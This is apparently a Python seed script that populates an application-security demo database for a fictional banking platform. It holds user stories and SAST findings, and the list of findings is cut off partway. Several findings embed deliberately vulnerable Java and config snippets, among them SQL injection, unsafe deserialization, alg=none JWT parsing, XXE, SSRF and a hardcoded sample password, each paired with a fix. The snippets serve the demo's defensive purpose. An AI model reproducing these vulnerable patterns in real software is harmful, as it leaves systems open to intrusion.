"""
Seed script: Apex Banking — Complete demo dataset
Creates a fully aligned dataset across all platform modules:
  Project → User Stories (JIRA) → SAST/SCA/Secret Scans → Vulnerabilities
  → Threat Model → Security Controls → Client Threat Intel

Run: cd backend && python3 seed_apex_banking.py
"""
import sqlite3
import json
import os
from datetime import datetime, timedelta

DB_PATH = "appsec.db"
if os.path.exists("/app/data/appsec.db"):
    DB_PATH = "/app/data/appsec.db"

USER_ID = 1
USER_EMAIL = "admin@example.com"
NOW = datetime.utcnow().isoformat()

conn = sqlite3.connect(DB_PATH)
conn.row_factory = sqlite3.Row
c = conn.cursor()

# Ensure missing columns exist on threat_models
for col in ["fair_risk_analysis", "attack_trees", "kill_chain_analysis"]:
    try:
        c.execute(f"ALTER TABLE threat_models ADD COLUMN {col} JSON")
    except Exception:
        pass

# Ensure security_controls table exists (created by app migration on startup)
c.execute("""
    CREATE TABLE IF NOT EXISTS security_controls (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        project_id INTEGER NOT NULL,
        name TEXT NOT NULL,
        description TEXT,
        control_type TEXT DEFAULT 'preventive',
        status TEXT DEFAULT 'implemented',
        stride_categories TEXT,
        effectiveness REAL DEFAULT 0.7,
        owner TEXT,
        evidence TEXT,
        linked_threat_ids TEXT,
        linked_requirement_ids TEXT,
        created_by INTEGER,
        created_at TEXT DEFAULT (datetime('now')),
        updated_at TEXT
    )
""")

# ============================================================
# 1. PROJECT
# ============================================================
PROJECT_ID = 5
print("[1/8] Creating Apex Banking project (ID 5)...")
# Delete any existing project 5 data to start clean
c.execute("DELETE FROM vulnerabilities WHERE scan_id IN (SELECT id FROM scans WHERE project_id = ?)", (PROJECT_ID,))
c.execute("DELETE FROM scans WHERE project_id = ?", (PROJECT_ID,))
c.execute("DELETE FROM user_stories WHERE project_id = ?", (PROJECT_ID,))
c.execute("DELETE FROM security_controls WHERE project_id = ?", (PROJECT_ID,))
c.execute("DELETE FROM client_threat_intel WHERE project_id = ?", (PROJECT_ID,))
c.execute("DELETE FROM security_analyses WHERE user_story_id IN (SELECT id FROM user_stories WHERE project_id = ?)", (PROJECT_ID,))
c.execute("DELETE FROM threat_models WHERE project_id = ?", (PROJECT_ID,))
c.execute("DELETE FROM projects WHERE id = ?", (PROJECT_ID,))
c.execute("""
    INSERT INTO projects (id, name, description, repository_url, technology_stack, compliance_targets, industry_sector, risk_score, owner_id, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
""", (
    PROJECT_ID,
    "Apex Banking",
    "Enterprise digital banking platform — mobile & web. Handles account management, fund transfers (ACH/wire/RTP), bill pay, card management, loan origination, and customer KYC/AML workflows. Microservices architecture with Spring Boot backend, React frontend, PostgreSQL + Redis, deployed on AWS EKS.",
    "https://github.com/apex-financial/apex-banking-platform",
    json.dumps(["Java", "Spring Boot", "React", "TypeScript", "PostgreSQL", "Redis", "AWS", "Kafka", "Docker", "Kubernetes"]),
    json.dumps(["PCI-DSS v4.0", "SOX", "GLBA", "FFIEC", "OWASP Top 10", "NIST CSF"]),
    "banking",
    72.0,
    USER_ID,
    NOW,
))
print(f"   → Project ID: {PROJECT_ID}")

# ============================================================
# 2. USER STORIES (JIRA-aligned)
# ============================================================
print("[2/8] Adding JIRA user stories...")
stories = [
    {
        "title": "Implement Wire Transfer API with dual-approval workflow",
        "description": "As a business banking customer, I want to initiate domestic and international wire transfers from the web portal so that I can send funds to vendors and partners. Wire transfers above $10,000 require dual-approval from an authorized signer. The system must validate beneficiary details, check OFAC sanctions lists, and generate a Fedwire message. Must support same-day ACH and standard wire timelines.",
        "acceptance_criteria": "1. User can enter beneficiary details (name, account, routing, SWIFT/BIC)\n2. Amount validation against daily/transaction limits\n3. OFAC/SDN screening before submission\n4. Dual-approval workflow for amounts > $10,000\n5. Fedwire/SWIFT message generation\n6. Email/SMS notification on transfer status\n7. Full audit trail with timestamps",
        "external_id": "APEX-101",
        "external_url": "https://apex-financial.atlassian.net/browse/APEX-101",
    },
    {
        "title": "Customer authentication with adaptive MFA",
        "description": "As a banking customer, I want to securely log in using my credentials with adaptive multi-factor authentication so that my account is protected against unauthorized access. The system should evaluate risk signals (new device, location, impossible travel) and step up authentication when risk is elevated. Support FIDO2/WebAuthn, TOTP, SMS OTP, and push notification as second factors.",
        "acceptance_criteria": "1. Username/password primary authentication\n2. Risk-based MFA step-up (device fingerprint, geolocation, velocity)\n3. FIDO2/WebAuthn hardware key support\n4. TOTP authenticator app support\n5. SMS OTP fallback with rate limiting\n6. Session management with idle/absolute timeouts\n7. Account lockout after 5 failed attempts\n8. Login audit log with IP, device, location",
        "external_id": "APEX-102",
        "external_url": "https://apex-financial.atlassian.net/browse/APEX-102",
    },
    {
        "title": "Account balance and transaction history API",
        "description": "As a customer, I want to view my real-time account balance and paginated transaction history so that I can track my spending and verify deposits. The API should support filtering by date range, transaction type, and amount. Must handle multiple account types (checking, savings, money market, CD). Transaction data is sourced from the core banking ledger via Kafka events.",
        "acceptance_criteria": "1. GET /api/accounts/{id}/balance returns real-time balance\n2. GET /api/accounts/{id}/transactions with pagination (limit/offset)\n3. Filter by date range, type (debit/credit/transfer/fee), amount range\n4. Support CSV/PDF export of transaction history\n5. Response time < 200ms for balance, < 500ms for transactions\n6. Authorization: user can only see own accounts\n7. Mask account numbers in responses (show last 4 digits)",
        "external_id": "APEX-103",
        "external_url": "https://apex-financial.atlassian.net/browse/APEX-103",
    },
    {
        "title": "Bill payment scheduling and recurring payments",
        "description": "As a customer, I want to schedule one-time and recurring bill payments to registered payees so that I never miss a payment. The system should support ACH and check payments, allow editing/cancelling scheduled payments before the processing cutoff, and send reminders before payment execution. Payee management includes adding, editing, and deleting payees with account validation.",
        "acceptance_criteria": "1. Add/edit/delete payees with account validation\n2. Schedule one-time payment with future date\n3. Set up recurring payments (weekly, bi-weekly, monthly)\n4. Edit/cancel scheduled payments before cutoff time\n5. Payment reminders via email/push 1 day before execution\n6. Support ACH and check payment methods\n7. Payment confirmation with reference number\n8. Insufficient funds handling and retry logic",
        "external_id": "APEX-104",
        "external_url": "https://apex-financial.atlassian.net/browse/APEX-104",
    },
    {
        "title": "KYC document upload and identity verification",
        "description": "As a new customer applying for an account, I want to upload my identity documents (passport, driver's license, utility bill) for KYC verification so that my account can be activated. The system should perform OCR extraction, liveness detection for selfie matching, and sanctions/PEP screening. Documents must be encrypted at rest and purged after the retention period.",
        "acceptance_criteria": "1. Upload government ID (passport, driver's license, state ID)\n2. Upload proof of address (utility bill, bank statement)\n3. Selfie capture with liveness detection\n4. OCR extraction of name, DOB, address from documents\n5. Face matching between ID photo and selfie (>95% confidence)\n6. PEP and sanctions screening\n7. AES-256 encryption of documents at rest\n8. Auto-purge after 7-year retention period\n9. Audit trail for all document access",
        "external_id": "APEX-105",
        "external_url": "https://apex-financial.atlassian.net/browse/APEX-105",
    },
    {
        "title": "Real-time fraud detection and alerting engine",
        "description": "As the fraud operations team, I want a real-time transaction monitoring engine that detects suspicious patterns and generates alerts so that we can prevent fraudulent transactions before they settle. The engine should consume transaction events from Kafka, apply ML models and rule-based checks, and escalate high-confidence fraud to the case management queue. Must support velocity checks, geo-anomaly detection, and behavioral biometrics.",
        "acceptance_criteria": "1. Real-time event consumption from Kafka transaction topic\n2. Rule-based checks: velocity, amount thresholds, blocked countries\n3. ML model scoring for anomaly detection\n4. Geo-anomaly: impossible travel detection\n5. Alert generation with risk score and reason codes\n6. Auto-block transactions above risk threshold\n7. Case management queue for manual review\n8. Analyst dashboard with alert details and customer history\n9. False positive feedback loop to improve ML model",
        "external_id": "APEX-106",
        "external_url": "https://apex-financial.atlassian.net/browse/APEX-106",
    },
    {
        "title": "Debit card management — activate, freeze, set limits",
        "description": "As a customer, I want to manage my debit card from the mobile app — activate a new card, temporarily freeze it, set daily spending/ATM limits, and report it lost/stolen — so that I have full control over my card security. Card operations must call the card processor API (Marqeta) in real-time. Must support virtual card generation for online purchases.",
        "acceptance_criteria": "1. Activate card via last 4 digits + CVV verification\n2. Freeze/unfreeze card instantly\n3. Set daily POS spending limit ($0 - $10,000)\n4. Set daily ATM withdrawal limit ($0 - $2,000)\n5. Report lost/stolen → immediate permanent block\n6. Generate virtual card number for online purchases\n7. View recent card transactions\n8. Push notification on every card transaction\n9. Card controls reflected at processor within 2 seconds",
        "external_id": "APEX-107",
        "external_url": "https://apex-financial.atlassian.net/browse/APEX-107",
    },
    {
        "title": "Internal admin portal with role-based access control",
        "description": "As a bank operations admin, I want an internal portal where I can manage customer accounts, review flagged transactions, process disputes, and manage user roles so that back-office operations run efficiently. The portal must enforce RBAC with least-privilege: tellers see customer info but can't modify; supervisors can override holds; compliance officers access AML reports. All actions must be audit-logged.",
        "acceptance_criteria": "1. Role hierarchy: teller < supervisor < compliance < admin\n2. Teller: view customer profile, view transactions\n3. Supervisor: override holds, approve high-value transactions\n4. Compliance: access AML/SAR reports, freeze accounts\n5. Admin: manage users, assign roles, configure system settings\n6. Every action audit-logged with user, timestamp, IP, action\n7. Session timeout: 15 min idle, 8 hours absolute\n8. IP allowlisting for admin role\n9. Break-glass emergency access with manager approval",
        "external_id": "APEX-108",
        "external_url": "https://apex-financial.atlassian.net/browse/APEX-108",
    },
]

story_ids = []
for s in stories:
    c.execute("""
        INSERT INTO user_stories (project_id, title, description, acceptance_criteria, source, external_id, external_url, is_analyzed, risk_score, threat_count, requirement_count, created_by, created_at)
        VALUES (?, ?, ?, ?, 'JIRA', ?, ?, 1, ?, ?, ?, ?, ?)
    """, (
        PROJECT_ID, s["title"], s["description"], s["acceptance_criteria"],
        s["external_id"], s["external_url"],
        75 + (len(story_ids) * 3 % 20),  # risk scores 75-95
        4 + (len(story_ids) % 4),  # 4-7 threats per story
        8 + (len(story_ids) * 2 % 12),  # 8-20 requirements per story
        USER_ID, NOW,
    ))
    story_ids.append(c.lastrowid)

print(f"   → {len(story_ids)} stories created (APEX-101 to APEX-108)")

# ============================================================
# 3. SAST SCAN
# ============================================================
print("[3/8] Adding SAST scan with findings...")
c.execute("""
    INSERT INTO scans (project_id, scan_type, status, started_at, completed_at, total_findings, critical_count, high_count, medium_count, low_count, info_count)
    VALUES (?, 'SAST', 'COMPLETED', ?, ?, 47, 6, 14, 18, 7, 2)
""", (PROJECT_ID, NOW, NOW))
SAST_SCAN_ID = c.lastrowid

sast_findings = [
    # CRITICAL
    ("SQL Injection in Fund Transfer Query", "Direct string concatenation of user-supplied beneficiary account number into SQL query in the wire transfer service. An attacker could manipulate the query to transfer funds to unauthorized accounts or extract sensitive data from the database.", "CRITICAL", "CWE-89", "A03:2021 - Injection", 9.8, "src/main/java/com/apex/transfer/WireTransferService.java", 142, 'String query = "SELECT * FROM accounts WHERE account_number = \'" + request.getBeneficiaryAccount() + "\'";', "Use parameterized queries with PreparedStatement. Replace string concatenation with JPA named parameters or Spring Data JPA query methods.", 'PreparedStatement ps = conn.prepareStatement("SELECT * FROM accounts WHERE account_number = ?");\nps.setString(1, request.getBeneficiaryAccount());', "Tampering", "T1190", "Exploit Public-Facing Application"),
    ("Hardcoded Database Credentials in Application Properties", "Production database credentials (username: apex_prod, password) hardcoded in application-prod.yml configuration file. This exposes the database to unauthorized access if source code is leaked.", "CRITICAL", "CWE-798", "A07:2021 - Identification and Authentication Failures", 9.6, "src/main/resources/application-prod.yml", 23, 'spring.datasource.password=Apex$Prod2024!SecureDB', "Move credentials to AWS Secrets Manager or HashiCorp Vault. Use Spring Cloud Config with encrypted values. Never commit credentials to source control.", 'spring.datasource.password=${DB_PASSWORD}  # Set via environment variable from AWS Secrets Manager', "Information Disclosure", "T1552.001", "Unsecured Credentials: Credentials In Files"),
    ("Insecure Deserialization in Session Handler", "Java ObjectInputStream used to deserialize user session data from cookies without validation. An attacker can craft a malicious serialized object to achieve remote code execution.", "CRITICAL", "CWE-502", "A08:2021 - Software and Data Integrity Failures", 9.8, "src/main/java/com/apex/auth/SessionManager.java", 87, 'ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.decode(sessionCookie)));\nUserSession session = (UserSession) ois.readObject();', "Replace Java serialization with JSON (Jackson). Implement allow-list deserialization filter. Use signed JWT tokens for session management instead.", 'UserSession session = objectMapper.readValue(Base64.decode(sessionCookie), UserSession.class);', "Tampering", "T1059", "Command and Scripting Interpreter"),
    ("Missing OFAC Sanctions Check Bypass", "Wire transfer amounts under $3,000 skip the OFAC/SDN sanctions screening due to a flawed conditional check. This violates BSA/AML regulations and could allow sanctioned entities to receive funds.", "CRITICAL", "CWE-862", "A01:2021 - Broken Access Control", 9.2, "src/main/java/com/apex/compliance/SanctionsService.java", 56, 'if (transfer.getAmount() > 3000.00) {\n    return ofacClient.screenBeneficiary(transfer.getBeneficiary());\n}\nreturn SanctionsResult.CLEAR; // BUG: skips screening for small amounts', "All transfers regardless of amount must undergo sanctions screening per BSA/AML regulations. Remove the amount threshold.", 'return ofacClient.screenBeneficiary(transfer.getBeneficiary()); // Screen ALL transfers', "Elevation of Privilege", "T1548", "Abuse Elevation Control Mechanism"),
    ("Broken JWT Signature Verification", "JWT token validation allows 'none' algorithm, enabling an attacker to forge authentication tokens by setting alg=none and removing the signature. Affects all API endpoints.", "CRITICAL", "CWE-347", "A02:2021 - Cryptographic Failures", 9.8, "src/main/java/com/apex/auth/JwtTokenProvider.java", 34, 'return Jwts.parser()\n    .setSigningKey(secretKey)\n    .parseClaimsJws(token) // Does not reject alg:none\n    .getBody();', "Explicitly set and validate the signing algorithm. Reject tokens with alg=none. Use asymmetric keys (RS256) instead of symmetric.", 'return Jwts.parserBuilder()\n    .setSigningKey(rsaPublicKey)\n    .requireAlgorithm("RS256")\n    .build()\n    .parseClaimsJws(token)\n    .getBody();', "Spoofing", "T1078", "Valid Accounts"),
    ("Unrestricted File Upload in KYC Document Handler", "KYC document upload endpoint accepts any file type without validation. An attacker can upload malicious JSP/WAR files that execute server-side code when accessed.", "CRITICAL", "CWE-434", "A04:2021 - Insecure Design", 9.0, "src/main/java/com/apex/kyc/DocumentUploadController.java", 45, '@PostMapping("/upload")\npublic ResponseEntity<?> uploadDocument(@RequestParam("file") MultipartFile file) {\n    String path = uploadDir + "/" + file.getOriginalFilename();\n    file.transferTo(new File(path));', "Validate file type against allowlist (PDF, JPG, PNG only). Sanitize filename. Store outside webroot. Scan with antivirus.", '@PostMapping("/upload")\npublic ResponseEntity<?> uploadDocument(@RequestParam("file") MultipartFile file) {\n    if (!ALLOWED_TYPES.contains(file.getContentType())) throw new BadRequestException("Invalid file type");\n    String safeName = UUID.randomUUID() + "." + getExtension(file);\n    s3Client.putObject(kycBucket, safeName, file.getInputStream());', "Tampering", "T1105", "Ingress Tool Transfer"),
    # HIGH
    ("Cross-Site Scripting (XSS) in Transaction Search", "User-supplied search query reflected in transaction history page without encoding. An attacker can inject JavaScript to steal session tokens or redirect users to phishing sites.", "HIGH", "CWE-79", "A03:2021 - Injection", 7.5, "src/main/webapp/views/transactions.jsp", 112, '<span>Search results for: ${param.query}</span>', "Use JSTL escapeXml or Spring Security's HtmlUtils.htmlEscape() for all user-supplied data rendered in HTML.", '<span>Search results for: <c:out value="${param.query}"/></span>', "Information Disclosure", "T1189", "Drive-by Compromise"),
    ("Insecure Direct Object Reference in Account API", "Account balance endpoint uses sequential account ID without ownership verification. A logged-in user can access any customer's account balance by changing the ID parameter.", "HIGH", "CWE-639", "A01:2021 - Broken Access Control", 8.2, "src/main/java/com/apex/account/AccountController.java", 78, '@GetMapping("/api/accounts/{accountId}/balance")\npublic AccountBalance getBalance(@PathVariable Long accountId) {\n    return accountService.getBalance(accountId); // No ownership check', "Implement ownership verification. Compare the authenticated user's accounts with the requested accountId before returning data.", '@GetMapping("/api/accounts/{accountId}/balance")\npublic AccountBalance getBalance(@PathVariable Long accountId, Authentication auth) {\n    accountService.verifyOwnership(auth.getUserId(), accountId);\n    return accountService.getBalance(accountId);', "Information Disclosure", "T1530", "Data from Cloud Storage Object"),
    ("Weak Password Policy in Registration", "Password validation only requires 6 characters minimum with no complexity requirements. Does not check against common password lists or breached password databases.", "HIGH", "CWE-521", "A07:2021 - Identification and Authentication Failures", 7.0, "src/main/java/com/apex/auth/PasswordValidator.java", 15, 'if (password.length() < 6) {\n    throw new ValidationException("Password too short");\n}', "Enforce NIST 800-63B guidelines: minimum 12 characters, check against breached password list (HaveIBeenPwned API), allow passphrases.", 'passwordValidator.validate(password, new PasswordData(password),\n    new LengthRule(12, 128),\n    new CharacterCharacteristicsRule(3,\n        new DigitCharacterRule(1), new UppercaseCharacterRule(1),\n        new LowercaseCharacterRule(1), new SpecialCharacterRule(1)),\n    new DictionarySubstringRule(breachedPasswordDictionary));', "Spoofing", "T1110", "Brute Force"),
    ("Missing Rate Limiting on Login Endpoint", "Authentication endpoint has no rate limiting or account lockout mechanism. An attacker can perform unlimited brute-force login attempts.", "HIGH", "CWE-307", "A07:2021 - Identification and Authentication Failures", 7.5, "src/main/java/com/apex/auth/AuthController.java", 32, '@PostMapping("/api/auth/login")\npublic ResponseEntity<?> login(@RequestBody LoginRequest request) {\n    return authService.authenticate(request.getUsername(), request.getPassword());', "Implement rate limiting (5 attempts per minute per IP/account). Add progressive delays and account lockout after 5 consecutive failures.", '@PostMapping("/api/auth/login")\n@RateLimited(maxAttempts = 5, windowMinutes = 1)\npublic ResponseEntity<?> login(@RequestBody LoginRequest request) {\n    accountLockoutService.checkLockout(request.getUsername());\n    return authService.authenticate(request);', "Spoofing", "T1110.001", "Brute Force: Password Guessing"),
    ("Sensitive Data in Application Logs", "Customer PII (SSN, account numbers, email addresses) logged at DEBUG level in the transaction processing service. Log aggregation in Splunk exposes PII to all operations staff.", "HIGH", "CWE-532", "A09:2021 - Security Logging and Monitoring Failures", 7.2, "src/main/java/com/apex/transfer/TransferProcessor.java", 94, 'logger.debug("Processing transfer for customer: SSN={}, account={}, amount={}",\n    customer.getSsn(), customer.getAccountNumber(), transfer.getAmount());', "Never log PII. Use structured logging with data classification. Implement a PII redaction filter for all log output.", 'logger.debug("Processing transfer for customer: id={}, accountRef={}, amount={}",\n    customer.getId(), maskAccount(customer.getAccountNumber()), transfer.getAmount());', "Information Disclosure", "T1005", "Data from Local System"),
    ("Missing CSRF Protection on Fund Transfer", "The fund transfer form does not include CSRF tokens. An attacker can craft a malicious page that submits a transfer request when a logged-in user visits it.", "HIGH", "CWE-352", "A01:2021 - Broken Access Control", 8.0, "src/main/java/com/apex/config/SecurityConfig.java", 42, 'http.csrf().disable() // FIXME: re-enable CSRF\n    .authorizeRequests()', "Enable Spring Security CSRF protection. Include CSRF token in all state-changing forms and AJAX requests.", 'http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())\n    .authorizeRequests()', "Tampering", "T1557", "Adversary-in-the-Middle"),
    ("Insufficient TLS Configuration", "Application server configured to accept TLS 1.0 and 1.1 connections, which are vulnerable to POODLE and BEAST attacks. Does not enforce HTTP Strict Transport Security.", "HIGH", "CWE-326", "A02:2021 - Cryptographic Failures", 7.4, "src/main/resources/application.yml", 8, 'server:\n  ssl:\n    protocol: TLS\n    enabled-protocols: TLSv1,TLSv1.1,TLSv1.2', "Disable TLS 1.0 and 1.1. Only allow TLS 1.2+. Enable HSTS with includeSubDomains and preload.", 'server:\n  ssl:\n    protocol: TLS\n    enabled-protocols: TLSv1.2,TLSv1.3\n    ciphers: TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256', "Information Disclosure", "T1557", "Adversary-in-the-Middle"),
    ("Mass Assignment in Customer Profile Update", "Customer profile update endpoint binds all request parameters to the Customer entity, allowing an attacker to modify internal fields like `role`, `accountStatus`, and `kycVerified`.", "HIGH", "CWE-915", "A04:2021 - Insecure Design", 8.1, "src/main/java/com/apex/customer/CustomerController.java", 65, '@PutMapping("/api/customers/{id}")\npublic Customer updateCustomer(@PathVariable Long id, @RequestBody Customer customer) {\n    return customerRepo.save(customer); // Binds ALL fields', "Use a DTO with only allowed fields (name, email, phone, address). Never bind request data directly to entity objects.", '@PutMapping("/api/customers/{id}")\npublic Customer updateCustomer(@PathVariable Long id, @RequestBody @Valid CustomerUpdateDTO dto) {\n    Customer customer = customerRepo.findById(id).orElseThrow();\n    customer.setName(dto.getName());\n    customer.setEmail(dto.getEmail());\n    return customerRepo.save(customer);', "Elevation of Privilege", "T1098", "Account Manipulation"),
    ("Server-Side Request Forgery in Webhook Handler", "Webhook callback URL provided by third-party payment processors is fetched server-side without URL validation. Attacker can point to internal services (metadata endpoint, Redis, etc.).", "HIGH", "CWE-918", "A10:2021 - Server-Side Request Forgery", 8.6, "src/main/java/com/apex/webhook/WebhookProcessor.java", 28, 'URL url = new URL(webhookConfig.getCallbackUrl());\nHttpURLConnection conn = (HttpURLConnection) url.openConnection();', "Validate webhook URLs against allowlist of known processor domains. Block internal/private IP ranges. Use a dedicated egress proxy.", 'if (!ALLOWED_WEBHOOK_HOSTS.contains(new URL(callbackUrl).getHost())) {\n    throw new SecurityException("Webhook URL not in allowlist");\n}', "Tampering", "T1090", "Proxy"),
    ("XML External Entity (XXE) in Payment File Parser", "Bank payment file (ISO 20022 XML) parser allows external entity resolution, enabling attackers to read local files or perform SSRF via crafted payment files.", "HIGH", "CWE-611", "A05:2021 - Security Misconfiguration", 8.2, "src/main/java/com/apex/payment/ISO20022Parser.java", 33, 'DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n// No XXE protection configured\nDocument doc = factory.newDocumentBuilder().parse(paymentFile);', "Disable external entity processing in XML parser. Set FEATURE_SECURE_PROCESSING and disable DOCTYPE declarations.", 'DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nfactory.setFeature("http://xml.org/sax/features/external-general-entities", false);\nDocument doc = factory.newDocumentBuilder().parse(paymentFile);', "Information Disclosure", "T1005", "Data from Local System"),
    ("Unvalidated Redirect in OAuth Callback", "OAuth2 redirect_uri parameter not validated against registered URIs. Attacker can steal authorization codes by redirecting to a malicious site.", "HIGH", "CWE-601", "A01:2021 - Broken Access Control", 7.4, "src/main/java/com/apex/auth/OAuthController.java", 52, '@GetMapping("/oauth/callback")\npublic void handleCallback(@RequestParam String redirect_uri, @RequestParam String code) {\n    response.sendRedirect(redirect_uri + "?code=" + code);', "Validate redirect_uri against a strict allowlist of pre-registered URIs. Never pass user-controlled redirect destinations.", 'if (!REGISTERED_REDIRECT_URIS.contains(redirect_uri)) {\n    throw new SecurityException("Invalid redirect_uri");\n}\nresponse.sendRedirect(redirect_uri + "?code=" + code);', "Spoofing", "T1566", "Phishing"),
    # MEDIUM
    ("Missing Content Security Policy Header", "Application does not set Content-Security-Policy header, making it vulnerable to XSS and data injection attacks. No frame-ancestors directive allows clickjacking.", "MEDIUM", "CWE-1021", "A05:2021 - Security Misconfiguration", 5.3, "src/main/java/com/apex/config/SecurityConfig.java", 55, '// No CSP header configured', "Add strict CSP header: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'; form-action 'self'.", 'http.headers()\n    .contentSecurityPolicy("default-src \'self\'; script-src \'self\'; frame-ancestors \'none\'")\n    .and().frameOptions().deny();', "Information Disclosure", None, None),
    ("Verbose Error Messages Exposing Stack Traces", "API endpoints return full Java stack traces with internal class names, database schema, and SQL queries in error responses. Reveals server technology and internal architecture.", "MEDIUM", "CWE-209", "A05:2021 - Security Misconfiguration", 5.0, "src/main/java/com/apex/config/GlobalExceptionHandler.java", 18, 'return ResponseEntity.status(500).body(Map.of(\n    "error", ex.getMessage(),\n    "stackTrace", Arrays.toString(ex.getStackTrace())\n));', "Return generic error messages to clients. Log full details server-side. Use correlation IDs for debugging.", 'logger.error("Request failed [correlationId={}]", correlationId, ex);\nreturn ResponseEntity.status(500).body(Map.of(\n    "error", "An internal error occurred",\n    "correlationId", correlationId\n));', "Information Disclosure", None, None),
    ("Insecure Cookie Configuration", "Session cookie missing Secure, HttpOnly, and SameSite attributes. Cookie accessible via JavaScript and sent over HTTP connections.", "MEDIUM", "CWE-614", "A05:2021 - Security Misconfiguration", 5.5, "src/main/java/com/apex/config/SessionConfig.java", 12, 'Cookie cookie = new Cookie("APEXSESSION", sessionId);\ncookie.setPath("/");', "Set Secure, HttpOnly, and SameSite=Strict flags on all session cookies.", 'Cookie cookie = new Cookie("APEXSESSION", sessionId);\ncookie.setPath("/");\ncookie.setSecure(true);\ncookie.setHttpOnly(true);\nresponse.setHeader("Set-Cookie", cookie.getName() + "=..." + "; SameSite=Strict");', "Spoofing", None, None),
    ("Insufficient Input Validation on Transfer Amount", "Wire transfer amount field accepts negative values and values with more than 2 decimal places, which could cause accounting discrepancies in the ledger.", "MEDIUM", "CWE-20", "A03:2021 - Injection", 6.0, "src/main/java/com/apex/transfer/TransferValidator.java", 28, 'if (amount == null) throw new ValidationException("Amount required");\n// No min/max/precision validation', "Validate: amount > 0, amount <= daily limit, max 2 decimal places. Use BigDecimal for all monetary calculations.", 'if (amount == null || amount.compareTo(BigDecimal.ZERO) <= 0 ||\n    amount.scale() > 2 || amount.compareTo(DAILY_LIMIT) > 0) {\n    throw new ValidationException("Invalid transfer amount");\n}', "Tampering", None, None),
    ("Missing Audit Logging on Admin Actions", "Admin portal actions (role changes, account freezes, limit overrides) not logged to the audit trail. Violates SOX compliance requirements for financial institutions.", "MEDIUM", "CWE-778", "A09:2021 - Security Logging and Monitoring Failures", 6.5, "src/main/java/com/apex/admin/AdminService.java", 112, 'public void changeUserRole(Long userId, String newRole) {\n    User user = userRepo.findById(userId).orElseThrow();\n    user.setRole(newRole);\n    userRepo.save(user);\n    // No audit logging', "Add audit logging for all admin actions. Log: who, what, when, where (IP), before/after values. Send to immutable audit log (append-only).", 'public void changeUserRole(Long userId, String newRole) {\n    User user = userRepo.findById(userId).orElseThrow();\n    String oldRole = user.getRole();\n    user.setRole(newRole);\n    userRepo.save(user);\n    auditService.log(AuditEvent.ROLE_CHANGE, userId, Map.of("oldRole", oldRole, "newRole", newRole));', "Repudiation", None, None),
    ("Outdated Encryption Algorithm for PII at Rest", "Customer SSN and account numbers encrypted using DES algorithm which has been broken since 1999. Key size of 56 bits is trivially brute-forceable.", "MEDIUM", "CWE-327", "A02:2021 - Cryptographic Failures", 6.8, "src/main/java/com/apex/crypto/PiiEncryptor.java", 19, 'Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");', "Migrate to AES-256-GCM for PII encryption. Use unique IV per encryption. Implement key rotation schedule.", 'Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");\ncipher.init(Cipher.ENCRYPT_MODE, aes256Key, new GCMParameterSpec(128, iv));', "Information Disclosure", None, None),
    ("Missing HTTP Security Headers", "Application missing several security headers: X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy.", "MEDIUM", "CWE-693", "A05:2021 - Security Misconfiguration", 4.3, "src/main/java/com/apex/config/WebConfig.java", 22, '// Security headers not configured', "Add all recommended security headers via Spring Security configuration.", 'http.headers()\n    .xssProtection().and()\n    .contentTypeOptions().and()\n    .frameOptions().deny().and()\n    .referrerPolicy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN);', None, None, None),
    ("Predictable Session Token Generation", "Session IDs generated using java.util.Random (not cryptographically secure). Attacker can predict future session tokens and hijack user sessions.", "MEDIUM", "CWE-330", "A02:2021 - Cryptographic Failures", 6.2, "src/main/java/com/apex/auth/SessionManager.java", 22, 'Random random = new Random();\nString sessionId = Long.toHexString(random.nextLong());', "Use java.security.SecureRandom for session token generation. Ensure at least 128 bits of entropy.", 'SecureRandom secureRandom = new SecureRandom();\nbyte[] bytes = new byte[32];\nsecureRandom.nextBytes(bytes);\nString sessionId = Base64.getUrlEncoder().encodeToString(bytes);', "Spoofing", None, None),
    ("Open CORS Configuration", "CORS policy allows all origins (*) with credentials. Any website can make authenticated API requests on behalf of logged-in users.", "MEDIUM", "CWE-942", "A05:2021 - Security Misconfiguration", 5.8, "src/main/java/com/apex/config/CorsConfig.java", 15, 'config.addAllowedOrigin("*");\nconfig.setAllowCredentials(true);', "Restrict CORS to specific allowed origins. Never use wildcard with credentials.", 'config.setAllowedOrigins(List.of("https://app.apexbanking.com", "https://admin.apexbanking.com"));\nconfig.setAllowCredentials(true);', "Information Disclosure", None, None),
    # ... more medium findings
    ("Unencrypted Redis Connection", "Redis cache connection for session storage uses plaintext protocol without TLS. Session data transmitted in cleartext on the internal network.", "MEDIUM", "CWE-319", "A02:2021 - Cryptographic Failures", 5.5, "src/main/resources/application.yml", 45, 'spring.redis.host=redis-prod.internal\nspring.redis.port=6379\n# No TLS configuration', "Enable TLS for Redis connections. Use mutual TLS in production.", 'spring.redis.host=redis-prod.internal\nspring.redis.port=6380\nspring.redis.ssl=true\nspring.redis.ssl.key-store=classpath:redis-client.p12', "Information Disclosure", None, None),
    ("Path Traversal in Document Download", "KYC document download endpoint constructs file path from user input without sanitization. Attacker can use ../ to read arbitrary files from the server.", "MEDIUM", "CWE-22", "A01:2021 - Broken Access Control", 6.5, "src/main/java/com/apex/kyc/DocumentController.java", 72, 'File file = new File(documentsDir + "/" + request.getParameter("filename"));', "Validate filename against allowlist pattern. Resolve canonical path and verify it's within the expected directory.", 'Path resolved = Paths.get(documentsDir).resolve(filename).normalize();\nif (!resolved.startsWith(Paths.get(documentsDir))) throw new SecurityException("Path traversal");', "Information Disclosure", None, None),
    # LOW
